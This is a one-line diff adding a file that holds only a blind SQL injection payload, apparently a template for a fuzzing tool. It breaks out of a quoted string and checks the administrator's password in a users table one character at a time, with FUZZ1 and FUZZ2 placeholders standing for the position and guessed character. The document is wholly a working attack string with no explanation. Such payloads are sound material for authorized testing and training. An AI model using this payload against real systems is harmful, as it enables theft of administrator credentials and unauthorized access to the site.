@@ -1,0 +1,1 @@
+' OR SUBSTRING((SELECT password FROM users WHERE username = 'administrator' LIMIT 1), FUZZ1, 1) > 'FUZZ2'--
